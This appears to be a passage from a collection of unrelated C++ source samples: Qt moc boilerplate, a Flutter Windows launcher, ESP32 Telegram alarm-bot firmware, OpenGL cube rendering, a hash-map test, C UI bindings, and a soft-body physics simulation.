MemoryScanner::staticMetaObject = { {\n    QMetaObject::SuperData::link<QWidget::staticMetaObject>(),\n    qt_meta_stringdata_CLASSMemoryScannerENDCLASS.offsetsAndSizes,\n    qt_meta_data_CLASSMemoryScannerENDCLASS,\n    qt_static_metacall,\n    nullptr,\n    qt_incomplete_metaTypeArray<qt_meta_stringdata_CLASSMemoryScannerENDCLASS_t,\n        // Q_OBJECT / Q_GADGET\n        QtPrivate::TypeAndForceComplete<MemoryScanner, std::true_type>,\n        // method 'scanMemory'\n        QtPrivate::TypeAndForceComplete<void, std::false_type>,\n        // method 'saveResults'\n        QtPrivate::TypeAndForceComplete<void, std::false_type>,\n        // method 'loadResults'\n        QtPrivate::TypeAndForceComplete<void, std::false_type>\n    >,\n    nullptr\n} };\n\nvoid MemoryScanner::qt_static_metacall(QObject *_o, QMetaObject::Call _c, int _id, void **_a)\n{\n    if (_c == QMetaObject::InvokeMetaMethod) {\n        auto *_t = static_cast<MemoryScanner *>(_o);\n        (void)_t;\n        switch (_id) {\n        case 0: _t->scanMemory(); break;\n        case 1: _t->saveResults(); break;\n        case 2: _t->loadResults(); break;\n        default: ;\n        }\n    }\n    (void)_a;\n}\n\nconst QMetaObject *MemoryScanner::metaObject() const\n{\n    return QObject::d_ptr->metaObject ? QObject::d_ptr->dynamicMetaObject() : &staticMetaObject;\n}\n\nvoid *MemoryScanner::qt_metacast(const char *_clname)\n{\n    if (!_clname) return nullptr;\n    if (!strcmp(_clname, qt_meta_stringdata_CLASSMemoryScannerENDCLASS.stringdata0))\n        return static_cast<void*>(this);\n    return QWidget::qt_metacast(_clname);\n}\n\nint MemoryScanner::qt_metacall(QMetaObject::Call _c, int _id, void **_a)\n{\n    _id = QWidget::qt_metacall(_c, _id, _a);\n    if (_id < 0)\n        return _id;\n    if (_c == QMetaObject::InvokeMetaMethod) {\n        if (_id < 3)\n            qt_static_metacall(this, _c, _id, _a);\n        _id -= 3;\n    } else if (_c == QMetaObject::RegisterMethodArgumentMetaType) {\n        if (_id < 3)\n            *reinterpret_cast<QMetaType *>(_a[0]) = QMetaType();\n        _id -= 3;\n    }\n    return _id;\n}\nQT_WARNING_POP\n",
    "#include <flutter/dart_project.h>\n#include <flutter/flutter_view_controller.h>\n#include <windows.h>\n\n#include \"flutter_window.h\"\n#include \"utils.h\"\n\nint APIENTRY wWinMain(_In_ HINSTANCE instance, _In_opt_ HINSTANCE prev,\n                      _In_ wchar_t *command_line, _In_ int show_command) {\n  // Attach to console when present (e.g., 'flutter run') or create a\n  // new console when running with a debugger.\n  if (!::AttachConsole(ATTACH_PARENT_PROCESS) && ::IsDebuggerPresent()) {\n    CreateAndAttachConsole();\n  }\n\n  // Initialize COM, so that it is available for use in the library and/or\n  // plugins.\n  ::CoInitializeEx(nullptr, COINIT_APARTMENTTHREADED);\n\n  flutter::DartProject project(L\"data\");\n\n  std::vector<std::string> command_line_arguments =\n      GetCommandLineArguments();\n\n  project.set_dart_entrypoint_arguments(std::move(command_line_arguments));\n\n  FlutterWindow window(project);\n  Win32Window::Point origin(10, 10);\n  Win32Window::Size size(1280, 720);\n  if (!window.Create(L\"chatt_app\", origin, size)) {\n    return EXIT_FAILURE;\n  }\n  window.SetQuitOnClose(true);\n\n  ::MSG msg;\n  while (::GetMessage(&msg, nullptr, 0, 0)) {\n    ::TranslateMessage(&msg);\n    ::DispatchMessage(&msg);\n  }\n\n  ::CoUninitialize();\n  return EXIT_SUCCESS;\n}\n",
    "#include <MAIN.h>\r\n#include \"esp32_pir_tg_bot.h\"\r\nvoid mainTask(void* pvParameters) {\r\n\tsetup();\r\n\tfor (;;) {\r\n\t\twhile (status == prev_status) {};\r\n\t\t/*if (status != CHECK_MSG) { DEBUG(\"status \"); DEBUGLN(status); }*/\r\n\t\tswitch (status) {\r\n\t\tcase LINE_OK: tg_send(\"OK\"); continue;\r\n\t\tcase ALARM: tg_send(\"ALARM\"); continue;\r\n\t\tcase LINE_HIGH: tg_send(\"LINE_HIGH\"); continue;\r\n\t\tcase LINE_LOW: tg_send(\"LINE_LOW\"); continue;\r\n\t\tcase CHECK_MSG: status = prev_status;\r\n\t\t\tif (wifi_sta_init()) bot.tick(); continue;\r\n\t\tcase WIFI_DISCONNECT: status = prev_status;\r\n\t\t\ttime_sync(); timerAlarm(TIMER_RECONNECT, WIFI_RECON);\r\n\t\t\tWiFi.disconnect(); continue;\r\n\t\tcase WIFI_INIT: status = prev_status;\r\n\t\t\tif (wifi_sta_init()) { time_sync(); timerAlarm(TIMER_CHECK, CHECK_MSG); } continue;\r\n\t\tcase WIFI_RECON: status = prev_status;\r\n\t\t\tif (wifi_sta_init()) {\r\n\t\t\t\tbot.tickManual();\r\n\t\t\t\tif (interrupt_flag == WIFI_RECON) { time_sync(); WiFi.disconnect(); }\r\n\t\t\t} continue;\r\n\t\tcase RESEND_MSG: status = prev_status;\r\n\t\t\tif (wifi_sta_init()) send_alarm_time(CHAT_ID); continue;\r\n\t\tcase RESTART: bot.tickManual(); delay(1000); ESP.restart();\r\n\t\t}\r\n\t}\r\n}\r\n\r\nvoid setup() {\r\n\tpinMode(PIN_LINE, INPUT); //pinMode(5, INPUT_PULLUP); \r\n\tpinMode(PIN_LED, OUTPUT); //pinMode(PIN_RELAY, OUTPUT);\r\n\tattachInterrupt(PIN_LINE, &ISR, FALLING);\r\n\t//TickType_t wake = xTaskGetTickCount();\r\n#ifdef ESP32C3_LUATOS\r\n\tdWrite(PIN_LED, LED_OFF); pinMode(PIN_LED_D5, OUTPUT); dWrite(PIN_LED_D5, LED_ON);\r\n#else\r\n\tdWrite(PIN_LED, LED_ON);\r\n#endif\r\n\tif (!SPIFFS.begin()) DEBUGLN(\"\\nAn error has occurred while mounting SPIFFS\");\r\n\tWiFi.mode(WIFI_MODE_APSTA);\r\n\twifi_server_init();\r\n\tread_credentials();\r\n\twifi_sta_init();\r\n#ifdef DEBUG_ENABLE\r\n\tWiFi.printDiag(Serial);\r\n#endif \r\n\tconfigTime(3 * 3600, 0, \"ru.pool.ntp.org\", \"pool.ntp.org\");\r\n\ttime_sync();\r\n\t//client.setCACert(TELEGRAM_CERTIFICATE_ROOT);  //api.telegram.org\r\n\tbot.setPollMode(Poll::Long, 30000);\r\n\tbot.attachUpdate(updateHandler);\r\n\tbot.setToken(F(BOT_TOKEN));\r\n\tbot.skipUpdates();\r\n\tCHECK_(timer_init(TIMER_SABOTAGE, tmrSab, &sabotage_check));\r\n\tCHECK_(timer_init(TIMER_CHECK, tmrWifi, &wifi_check));\r\n\tbot.sendMessage(Message(get_info(), CHAT_ID));\r\n\t(void)send_alarm_time(CHAT_ID);\r\n#ifdef ESP32C3_LUATOS\r\n\tdWrite(PIN_LED_D5, LED_OFF);\r\n#else\r\n\tdWrite(PIN_LED, LED_OFF);\r\n#endif\r\n\tif (img_state(false) == ESP_OTA_IMG_PENDING_VERIFY) bot.sendMessage(Message(((String)\"ESP_OTA_IMG_PENDING_VERIFY\\n\" + __DATE__ + '\\t' + __TIME__), CHAT_ID)); \r\n\twhile (last_interrupt == 0 && uS < 2400000) {}; status = LINE_OK;\r\n\tlog_d(\"SETUP END\");\r\n}\r\nextern \"C\" void app_main() {\r\n\tmain_init();\r\n\tmainTaskHandle = xTaskCreateStaticPinnedToCore(mainTask, \"mainTask\", MAIN_TASK_STACK_SIZE, NULL, 2, xMainStack, &xMainTaskBuffer, ARDUINO_RUNNING_CORE);\r\n}\r\n\r\nvoid handleDocument(fb::Update& u) {\r\n\tswitch (u.message()[tg_apih::caption].hash()) {\r\n\tcase SH(\"/update_fw\"): otaBegin(u); break;\r\n\tcase SH(\"/update_fs\"): otaBegin(u, false); break;\r\n\tdefault: bot.sendMessage(Message(\"Unknown\", u.message().chat().id()));\r\n\t}\r\n}\r\n\r\nvoid handleMessage(fb::Update& u) {\r\n\tText chat = u.message().chat().id(); DEBUGLN(u.message().text());\r\n\tswitch (u.message().text().hash()) {\r\n\tcase SH(\"/connect\"):\r\n\t\tbot.sendMessage(Message(\"ESP will stay connected\", chat));\r\n\t\ttimerAlarm(TIMER_CHECK, CHECK_MSG); break;\r\n\tcase SH(\"/disconnect\"):\r\n\t\tbot.sendMessage(Message(\"Disconnecting...\", chat));\r\n\t\tstatus = WIFI_DISCONNECT; break;\r\n\tcase SH(\"/get_info\"):\r\n\t\tbot.sendMessage(Message(get_info(), chat)); break;\r\n#if defined RELAY\r\n\tcase SH(RELAY_ON):\r\n\t\tdWrite(PIN_RELAY, HIGH);\r\n\t\tbot.sendMessage(Message(\"RELAY ON\", chat)); break;\r\n\tcase SH(RELAY_OFF):\r\n\t\tdWrite(PIN_RELAY, LOW);\r\n\t\tbot.sendMessage(Message(\"RELAY OFF\", chat)); break;\r\n#endif\r\n\tcase SH(\"/restart\"):\r\n\t\tbot.sendMessage(Message(\"ESP restarting...\", chat)); bot.reboot();\r\n\t\tstatus = RESTART; break;\r\n\tcase SH(\"/ble\"): bot.sendMessage(Message(ble_advertising(ble_data, ble_data_size) ?\r\n\t\t\"BLE data sended\" : \"BLE data empty\", chat)); break;\r\n\tcase SH(\"/ble_clear\"): free(ble_data); ble_data = nullptr; ble_data_size = 0;\r\n\t\tbot.sendMessage(Message(\"Done\", chat)); break;\r\n\tcase SH(\"/send_alarm\"):\r\n\t\tif (!send_alarm_time(chat)) bot.sendMessage(Message(\"No file\", chat)); break;\r\n\tcase SH(\"/clear_alarm\"):\r\n\t\tbot.sendMessage(Message(deleteFile(ALARM_PATH) ? \"Done\" : \"No file\", chat)); break;\r\n\tcase SH(\"/valid\"):  esp_ota_mark_app_valid_cancel_rollback();\r\n\t\tbot.sendMessage(Message(String(img_state()), chat)); break;\r\n\tdefault: {\r\n\t\tif (u.message().text().startsWith(BLE_SET)) {\r\n\t\t\tif (strtoB(u.message().text(), sizeof(BLE_SET), ble_data, ble_data_size)) {\r\n\t\t\t\tbot.sendMessage(Message(create_hex_string(ble_data, ble_data_size), chat));\r\n\t\t\t}\r\n\t\t\telse bot.sendMessage(Message(\"Wrong format\", chat));\r\n\t\t}\r\n\t\telse bot.sendMessage(Message(\"Unknown\", chat)); }\r\n\t}\r\n}\r\n\r\nvoid updateHandler(fb::Update& u) {\r\n\tif (u.isMessage() && u.message().from().id() == USER_ID) {\r\n\t\ttimer_stop(tmrWifi);\r\n\t\tif (u.message().hasDocument() && u.messag",
    "#include <Shape/Cube.h>\n#include <Shader/Shader.h>\n#include <InputSystem/Input.h>\n\n\nCube::Cube(const std::string& textureFilename, Grid* parentGrid) : Object(parentGrid)\n{\n\tGLfloat vertices[] = { -0.5f,  0.5f,  0.5f,\n\t\t\t\t\t\t\t0.5f,  0.5f,  0.5f,\n\t\t\t\t\t\t\t0.5f, -0.5f,  0.5f,\n\t\t\t\t\t\t   -0.5f, -0.5f,  0.5f,\n\n\t\t\t\t\t\t\t0.5f,  0.5f, -0.5f,\n\t\t\t\t\t\t   -0.5f,  0.5f, -0.5f,\n\t\t\t\t\t\t   -0.5f, -0.5f, -0.5f,\n\t\t\t\t\t\t\t0.5f, -0.5f, -0.5f,\n\n\t\t\t\t\t\t   -0.5f,  0.5f, -0.5f,\n\t\t\t\t\t\t   -0.5f,  0.5f,  0.5f,\n\t\t\t\t\t\t   -0.5f, -0.5f,  0.5f,\n\t\t\t\t\t\t   -0.5f, -0.5f, -0.5f,\n\n\t\t\t\t\t\t\t0.5f,  0.5f,  0.5f,\n\t\t\t\t\t\t\t0.5f,  0.5f, -0.5f,\n\t\t\t\t\t\t\t0.5f, -0.5f, -0.5f,\n\t\t\t\t\t\t\t0.5f, -0.5f,  0.5f,\n\n\t\t\t\t\t\t   -0.5f,  0.5f, -0.5f,\n\t\t\t\t\t\t\t0.5f,  0.5f, -0.5f,\n\t\t\t\t\t\t\t0.5f,  0.5f,  0.5f,\n\t\t\t\t\t\t   -0.5f,  0.5f,  0.5f,\n\n\t\t\t\t\t\t   -0.5f, -0.5f,  0.5f,\n\t\t\t\t\t\t\t0.5f, -0.5f,  0.5f,\n\t\t\t\t\t\t\t0.5f, -0.5f, -0.5f,\n\t\t\t\t\t\t   -0.5f, -0.5f, -0.5f };\n\n\n\tGLfloat colors[] = { 1.0f, 1.0f, 1.0f, 1.0f,\n\t\t\t\t\t\t 1.0f, 1.0f, 1.0f, 1.0f,\n\t\t\t\t\t\t 1.0f, 1.0f, 1.0f, 1.0f,\n\t\t\t\t\t\t 1.0f, 1.0f, 1.0f, 1.0f,\n\n\t\t\t\t\t\t 1.0f, 1.0f, 1.0f, 1.0f,\n\t\t\t\t\t\t 1.0f, 1.0f, 1.0f, 1.0f,\n\t\t\t\t\t\t 1.0f, 1.0f, 1.0f, 1.0f,\n\t\t\t\t\t\t 1.0f, 1.0f, 1.0f, 1.0f,\n\n\t\t\t\t\t\t 1.0f, 1.0f, 1.0f, 1.0f,\n\t\t\t\t\t\t 1.0f, 1.0f, 1.0f, 1.0f,\n\t\t\t\t\t\t 1.0f, 1.0f, 1.0f, 1.0f,\n\t\t\t\t\t\t 1.0f, 1.0f, 1.0f, 1.0f,\n\n\t\t\t\t\t\t 1.0f, 1.0f, 1.0f, 1.0f,\n\t\t\t\t\t\t 1.0f, 1.0f, 1.0f, 1.0f,\n\t\t\t\t\t\t 1.0f, 1.0f, 1.0f, 1.0f,\n\t\t\t\t\t\t 1.0f, 1.0f, 1.0f, 1.0f,\n\n\t\t\t\t\t\t 1.0f, 1.0f, 1.0f, 1.0f,\n\t\t\t\t\t\t 1.0f, 1.0f, 1.0f, 1.0f,\n\t\t\t\t\t\t 1.0f, 1.0f, 1.0f, 1.0f,\n\t\t\t\t\t\t 1.0f, 1.0f, 1.0f, 1.0f,\n\n\t\t\t\t\t\t 1.0f, 1.0f, 1.0f, 1.0f,\n\t\t\t\t\t\t 1.0f, 1.0f, 1.0f, 1.0f,\n\t\t\t\t\t\t 1.0f, 1.0f, 1.0f, 1.0f,\n\t\t\t\t\t\t 1.0f, 1.0f, 1.0f, 1.0f };\n\n\n\tGLfloat UVs[] = { 0.0f, 1.0f, 1.0f, 1.0f,\n\t\t\t\t\t  1.0f, 0.0f, 0.0f, 0.0f,\n\n\t\t\t\t\t  0.0f, 1.0f, 1.0f, 1.0f,\n\t\t\t\t\t  1.0f, 0.0f, 0.0f, 0.0f,\n\n\t\t\t\t\t  0.0f, 1.0f, 1.0f, 1.0f,\n\t\t\t\t\t  1.0f, 0.0f, 0.0f, 0.0f,\n\n\t\t\t\t\t  0.0f, 1.0f, 1.0f, 1.0f,\n\t\t\t\t\t  1.0f, 0.0f, 0.0f, 0.0f,\n\n\t\t\t\t\t  0.0f, 1.0f, 1.0f, 1.0f,\n\t\t\t\t\t  1.0f, 0.0f, 0.0f, 0.0f,\n\n\t\t\t\t\t  0.0f, 1.0f, 1.0f, 1.0f,\n\t\t\t\t\t  1.0f, 0.0f, 0.0f, 0.0f };\n\n\n\n\tGLfloat normals[] = { 0.0f,  0.0f,  1.0f,  0.0f,  0.0f,  1.0f,\n\t\t\t\t\t\t  0.0f,  0.0f,  1.0f,  0.0f,  0.0f,  1.0f,\n\n\t\t\t\t\t\t   0.0f,  0.0f, -1.0f,  0.0f,  0.0f, -1.0f,\n\t\t\t\t\t\t   0.0f,  0.0f, -1.0f,  0.0f,  0.0f, -1.0f,\n\n\t\t\t\t\t\t  -1.0f,  0.0f,  0.0f, -1.0f,  0.0f,  0.0f,\n\t\t\t\t\t\t  -1.0f,  0.0f,  0.0f, -1.0f,  0.0f,  0.0f,\n\n\t\t\t\t\t\t   1.0f,  0.0f,  0.0f,  1.0f,  0.0f,  0.0f,\n\t\t\t\t\t\t   1.0f,  0.0f,  0.0f,  1.0f,  0.0f,  0.0f,\n\n\t\t\t\t\t\t   0.0f,  1.0f,  0.0f,  0.0f,  1.0f,  0.0f,\n\t\t\t\t\t\t   0.0f,  1.0f,  0.0f,  0.0f,  1.0f,  0.0f,\n\n\t\t\t\t\t\t   0.0f, -1.0f,  0.0f,  0.0f, -1.0f,  0.0f,\n\t\t\t\t\t\t   0.0f, -1.0f,  0.0f,  0.0f, -1.0f,  0.0f };\n\n\n\tGLuint indices[] = { 0,  1,  3,  3,  1,  2,\n\t\t\t\t\t\t 4,  5,  7,  7,  5,  6,\n\t\t\t\t\t\t 8,  9, 11, 11,  9, 10,\n\t\t\t\t\t\t12, 13, 15, 15, 13, 14,\n\t\t\t\t\t\t16, 17, 19, 19, 17, 18,\n\t\t\t\t\t\t20, 21, 23, 23, 21, 22 };\n\n\n\tm_buffer.CreateBuffer(36, true);\n\tm_buffer.FillEBO(indices, sizeof(indices), Buffer::FillType::FT_Single);\n\tm_buffer.FillVBO(Buffer::VBOType::VBOT_VertexBuffer, vertices, sizeof(vertices), Buffer::FillType::FT_Single);\n\tm_buffer.FillVBO(Buffer::VBOType::VBOT_ColorBuffer, colors, sizeof(colors), Buffer::FillType::FT_Single);\n\tm_buffer.FillVBO(Buffer::VBOType::VBOT_TextureBuffer, UVs, sizeof(UVs), Buffer::FillType::FT_Single);\n\tm_buffer.FillVBO(Buffer::VBOType::VBOT_NormalBuffer, normals, sizeof(normals), Buffer::FillType::FT_Single);\n\n\tm_buffer.LinkEBO();\n\n\tm_texture.Load(\"Assets/Textures/\" + textureFilename);\n\n\tm_material.SetShininess(50.0f);\n\tm_material.SetAmbient(glm::vec3(0.4f, 0.4f, 0.4f));\n\tm_material.SetDiffuse(glm::vec3(0.1f, 0.7f, 0.2f));\n\tm_material.SetSpecular(glm::vec3(0.8f, 0.8f, 0.8f));\n}\n\nCube::~Cube()\n{\n\tm_buffer.DestroyBuffer();\n}\n\nvoid Cube::Render(const Shader& shader)\n{\n\tObject::Render(shader);\n\n\tshader.SendUniformData(\"isTextured\", m_isTextured);\n\t//shader.SendUniformData(\"isLit\", false);\n\n\tm_material.SendToShader(shader);\n\n\tm_buffer.LinkVBO(shader, \"vertexIn\", Buffer::VBOType::VBOT_VertexBuffer, Buffer::ComponentType::CT_XYZ, Buffer::DataType::DT_Float);\n\tm_buffer.LinkVBO(shader, \"colorIn\", Buffer::VBOType::VBOT_ColorBuffer, Buffer::ComponentType::CT_RGBA, Buffer::DataType::DT_Float);\n\tm_buffer.LinkVBO(shader, \"textureIn\", Buffer::VBOType::VBOT_TextureBuffer, Buffer::ComponentType::CT_UV, Buffer::DataType::DT_Float);\n\tm_buffer.LinkVBO(shader, \"normalIn\", Buffer::VBOType::VBOT_NormalBuffer, Buffer::ComponentType::CT_XYZ, Buffer::DataType::DT_Float);\n\n\tif (m_isTextured)\n\t{\n\t\tm_texture.Bind();\n\t}\n\n\tm_buffer.Render(Buffer::DrawType::DwT_Triangles);\n\tm_texture.Unbind();\n}\n\nvoid Cube::SetColor(const glm::vec4& color)\n{\n\tstd::vector<glm::vec4> colors;\n\n\tfor(size_t i = 0; i < 24; i++)\n\t{\n\t\tcolors.push_back(color);\n\t}\n\n\tm_buffer.FillVBO(Buffer::VBOType::VBOT_ColorBuffer, colors.data(), colors.size() * sizeof(glm::vec4), Buffer::FillType::FT_Multiple);\n\n\tm_color = color;\n}\n",
    "#include <iostream>\n#include <cassert>\n#include \"hash_map.h\"\n\nvoid test_hash_map() {\n    // Create a hash map with initial capacity, upper and lower load factors\n    hash_map<int, std::string> map(10, 0.7f, 0.2f);\n\n    // Test insertion\n    map.insert(1, \"One\");\n    map.insert(2, \"Two\");\n    map.insert(3, \"Three\");\n\n    // Test size after insertions\n    assert(map.get_size() == 3);\n    std::cout << \"Insertion test passed. Size: \" << map.get_size() << std::endl;\n\n    // Test retrieval\n    auto value = map.get_value(2);\n    assert(value.has_value() && value.value() == \"Two\");\n    std::cout << \"Retrieval test passed. Value: \" << value.value() << std::endl;\n\n    // Test retrieval of a non-existing key\n    auto non_existing_value = map.get_value(4);\n    assert(!non_existing_value.has_value());\n    std::cout << \"Non-existing retrieval test passed.\" << std::endl;\n\n    // Test removal\n    bool removed = map.remove(2);\n    assert(removed);\n    assert(map.get_size() == 2);\n    assert(!map.get_value(2).has_value());\n    std::cout << \"Removal test passed. Size: \" << map.get_size() << std::endl;\n\n    // Test rehashing by exceeding the upper load factor\n    for (int i = 4; i <= 10; i++) {\n        map.insert(i, \"Value \" + std::to_string(i));\n        std::cout <<\"adding: \"<< i <<std::endl;\n    }\n\n    // Check size and capacity after rehashing\n    assert(map.get_size() == 7);\n    assert(map.get_capacity() > 10); // Ensure capacity increased\n    std::cout << \"Rehashing test passed. New Size: \" << map.get_size() << \", New Capacity: \" << map.get_capacity() << std::endl;\n\n    // Test retrieving all keys\n    int keys[10];\n    map.get_all_keys(keys);\n    std::cout << \"All keys: \";\n    for (size_t i = 0; i < map.get_size(); i++) {\n        std::cout << keys[i] << \" \";\n    }\n    std::cout << std::endl;\n\n    // Test sorted keys\n    int sorted_keys[10];\n    map.get_all_sorted_keys(sorted_keys);\n    std::cout << \"Sorted keys: \";\n    for (size_t i = 0; i < map.get_size(); i++) {\n        std::cout << sorted_keys[i] << \" \";\n    }\n    std::cout << std::endl;\n\n    // Test bucket sizes\n    size_t bucket_sizes[map.get_capacity()];\n    map.get_bucket_sizes(bucket_sizes);\n    std::cout << \"Bucket sizes: \";\n    for (size_t i = 0; i < map.get_capacity(); i++) {\n        std::cout << bucket_sizes[i] << \" \";\n    }\n    std::cout << std::endl;\n\n    // Cleanup is handled by the destructor\n}\n\nint main() {\n    test_hash_map();\n    std::cout << \"All tests passed!\" << std::endl;\n    return 0;\n}\n",
    "// clang++ lunaris/c/lunaris.cpp -shared -fPIC -o liblunaris.so\n\n#include \"../ui.hpp\"\n\nextern \"C\" {\n    /* Typedefs */\n    typedef lunaris::window lunaris_window;\n    typedef lunaris::layer lunaris_layer;\n\n    /* General */\n    lunaris_window* lunaris_new_window(){\n        return lunaris::new_window();\n    };\n    bool lunaris_window_set_decoration(lunaris_window* win, bool state){\n        return win->set_decoration(state);\n    };\n    void lunaris_window_set_title(lunaris_window* win, char* title){\n        return win->set_title(title);\n    };\n    void lunaris_window_set_fullscreen(lunaris_window* win, bool state){\n        return win->set_fullscreen(state);\n    };\n    void lunaris_window_resize(lunaris_window* win, int width, int height){\n        return win->resize(width, height);\n    };\n    void lunaris_window_loop(lunaris_window* win){\n        return win->loop();\n    };\n    void lunaris_window_register_draw_handler(lunaris_window* win, void (*draw_handler)(lunaris_window* win, uint32_t* buffer)){\n        win->draw_handler = draw_handler;\n    };\n    int lunaris_window_get_width(lunaris_window* win){\n        return win->width;\n    };\n    int lunaris_window_get_height(lunaris_window* win){\n        return win->height;\n    };\n\n    /* Graphics */\n    void lunaris_window_graphics_line(lunaris_window* win, int x1, int y1, int x2, int y2, uint32_t color){\n        return win->graphics.line(x1, y1, x2, y2, color);\n    };\n    void lunaris_window_graphics_line_thick(lunaris_window* win, int x1, int y1, int x2, int y2, int t, uint32_t color){\n        return win->graphics.line_thick(x1, y1, x2, y2, t, color);\n    };\n    void lunaris_window_graphics_rect(lunaris_window* win, int x, int y, int w, int h, uint32_t color){\n        return win->graphics.rect(x, y, w, h, color);\n    };\n    void lunaris_window_graphics_rect_empty(lunaris_window* win, int x, int y, int w, int h, int t, uint32_t color){\n        return win->graphics.rect_empty(x, y, w, h, t, color);\n    };\n    void lunaris_window_graphics_circle(lunaris_window* win, int x, int y, int r, uint32_t color){\n        return win->graphics.circle(x, y, r, color);\n    };\n    void lunaris_window_graphics_circle_empty(lunaris_window* win, int x, int y, int r, int t, uint32_t color){\n        return win->graphics.circle_empty(x, y, r, t, color);\n    };\n    void lunaris_window_graphics_rounded_rect(lunaris_window* win, int x, int y, int w, int h, int r, uint32_t color){\n        return win->graphics.rounded_rect(x, y, w, h, r, color);\n    };\n    void lunaris_window_graphics_rounded_rect_empty(lunaris_window* win, int x, int y, int w, int h, int r, int t, uint32_t color){\n        return win->graphics.rounded_rect_empty(x, y, w, h, r, t, color);\n    };\n    void lunaris_window_graphics_text(lunaris_window* win, int x, int y, int line_height, const char* text, uint32_t color){\n        return win->graphics.text(x, y, line_height, text, color);\n    };\n    void lunaris_window_graphics_text_bounding_area(lunaris_window* win, int* w, int* h, int line_height, const char* text){\n        std::pair<int, int> area = win->graphics.text_bounding_area(line_height, text);\n        *w = area.first;\n        *h = area.second;\n    };\n    void lunaris_window_graphics_image(lunaris_window* win, lunaris_layer* img, int x, int y, int width, int height){\n        return win->graphics.image(img, x, y, width, height);\n    };\n    \n    /* Image */\n    lunaris_layer* lunaris_new_image(const char* path){\n        return lunaris::new_image(path);\n    };\n}",
    "#include \"SoftBody.h\"\n\nSoftBody::SoftBody() : gravity(0.f, -9.8f, 0.f)\n{\n    // Read the house model from files.\n    // The model is from Jonathan Schewchuk's Stellar lib.\n    {\n        std::ifstream file(\"D:/Unity project/games103/Assets/house2.ele\");\n        std::stringstream fileStream;\n        fileStream << file.rdbuf();\n        std::vector<std::string> fileContent;\n        std::string token;\n        while (fileStream >> token)\n            fileContent.emplace_back(token);\n\n        tetNr = std::stoul(fileContent[0]);\n        tets.resize(tetNr);\n        for (unsigned int i = 0; i < tetNr; i++)\n        {\n            tets[i][0] = std::stoul(fileContent[i * 5 + 4]) - 1;\n            tets[i][1] = std::stoul(fileContent[i * 5 + 5]) - 1;\n            tets[i][2] = std::stoul(fileContent[i * 5 + 6]) - 1;\n            tets[i][3] = std::stoul(fileContent[i * 5 + 7]) - 1;\n        }\n    }\n\n    {\n        std::ifstream file(\"D:/Unity project/games103/Assets/house2.node\");\n        std::stringstream fileStream;\n        fileStream << file.rdbuf();\n        std::vector<std::string> fileContent;\n        std::string token;\n        while (fileStream >> token)\n            fileContent.emplace_back(token);\n\n        particleNr = std::stoul(fileContent[0]);\n        x.resize(particleNr);\n        for (unsigned int i = 0; i < particleNr; i++)\n        {\n            x[i].x = std::stof(fileContent[i * 5 + 5]) * 0.4f;\n            x[i].y = std::stof(fileContent[i * 5 + 6]) * 0.4f;\n            x[i].z = std::stof(fileContent[i * 5 + 7]) * 0.4f;\n        }\n\n        glm::vec3 center(0.f);\n        for (auto& x_i : x)\n            center += x_i;\n        center /= particleNr;\n\n        m.resize(particleNr);\n        for (unsigned int i = 0; i < particleNr; i++)\n        {\n            x[i] -= center;\n            std::swap(x[i].y, x[i].z);\n            m[i] = 1.f;\n        }\n    }\n\n    /*tet_number=1;\n    Tet = new int[tet_number*4];\n    Tet[0]=0;\n    Tet[1]=1;\n    Tet[2]=2;\n    Tet[3]=3;\n\n    number=4;\n    X = new Vector3[number];\n    V = new Vector3[number];\n    Force = new Vector3[number];\n    X[0]= new Vector3(0, 0, 0);\n    X[1]= new Vector3(1, 0, 0);\n    X[2]= new Vector3(0, 1, 0);\n    X[3]= new Vector3(0, 0, 1);*/\n\n    std::vector<glm::vec3> vertices(tetNr * 12);\n    unsigned int vertexNr = 0;\n    for (unsigned int i = 0; i < tetNr; i++)\n    {\n        vertices[vertexNr++] = x[tets[i][0]];\n        vertices[vertexNr++] = x[tets[i][2]];\n        vertices[vertexNr++] = x[tets[i][1]];\n\n        vertices[vertexNr++] = x[tets[i][0]];\n        vertices[vertexNr++] = x[tets[i][3]];\n        vertices[vertexNr++] = x[tets[i][2]];\n\n        vertices[vertexNr++] = x[tets[i][0]];\n        vertices[vertexNr++] = x[tets[i][1]];\n        vertices[vertexNr++] = x[tets[i][3]];\n\n        vertices[vertexNr++] = x[tets[i][1]];\n        vertices[vertexNr++] = x[tets[i][2]];\n        vertices[vertexNr++] = x[tets[i][3]];\n    }\n\n    std::vector<unsigned int> indices(tetNr * 12);\n    for (unsigned int i = 0; i < tetNr * 4; i++)\n    {\n        indices[i * 3 + 0] = i * 3 + 0;\n        indices[i * 3 + 1] = i * 3 + 1;\n        indices[i * 3 + 2] = i * 3 + 2;\n    }\n\n    mesh = new Mesh(\"house\", vertices, indices, std::vector<Texture>(), {glm::vec3(0.f), glm::vec3(0.f)});\n    mesh->recalculate_normals();\n\n    v.resize(particleNr);\n    f.resize(particleNr);\n\n    Dm_inv.resize(tetNr);\n    for (unsigned int i = 0; i < tetNr; i++)\n    {\n        const glm::vec3& x0 = x[tets[i][0]];\n        const glm::vec3& x1 = x[tets[i][1]];\n        const glm::vec3& x2 = x[tets[i][2]];\n        const glm::vec3& x3 = x[tets[i][3]];\n\n        glm::vec3 x10 = x1 - x0;\n        glm::vec3 x20 = x2 - x0;\n        glm::vec3 x30 = x3 - x0;\n        glm::mat3 Dm(x10, x20, x30);\n\n        Dm_inv[i] = glm::inverse(Dm);\n    }\n}\n\nvoid SoftBody::update(float deltaTime, Shader& shader)\n{\n    if (mesh == nullptr)\n        return;\n\n    FVM(deltaTime, shader);\n}\n\nvoid SoftBody::FVM(float deltaTime, Shader& shader)\n{\n    deltaTime = 0.003f;\n\n    for (unsigned int i = 0; i < particleNr; i++)\n        f[i] = m[i] * gravity;\n\n    for (unsigned int i = 0; i < tetNr; i++)\n    {\n        const glm::vec3& x0 = x[tets[i][0]];\n        const glm::vec3& x1 = x[tets[i][1]];\n        const glm::vec3& x2 = x[tets[i][2]];\n        const glm::vec3& x3 = x[tets[i][3]];\n\n        glm::vec3 x10 = x1 - x0;\n        glm::vec3 x20 = x2 - x0;\n        glm::vec3 x30 = x3 - x0;\n\n        glm::mat3 F = glm::mat3(x10, x20, x30) * Dm_inv[i];\n\n        glm::mat3 G = 0.5f * (glm::transpose(F) * F - glm::mat3(1.f));\n\n        glm::mat3 S = 2.f * mu * G + lambda * (G[0][0] + G[1][1] + G[2][2]) * glm::mat3(1.f);\n\n        glm::mat3 P = F * glm::transpose(S);\n\n        glm::mat3 fs = -1.f / (6.f * glm::determinant(Dm_inv[i])) * P * glm::transpose(Dm_inv[i]);\n        \n        f[tets[i][0]] += -fs[0] - fs[1] - fs[2];\n        f[tets[i][1]] += fs[0];\n        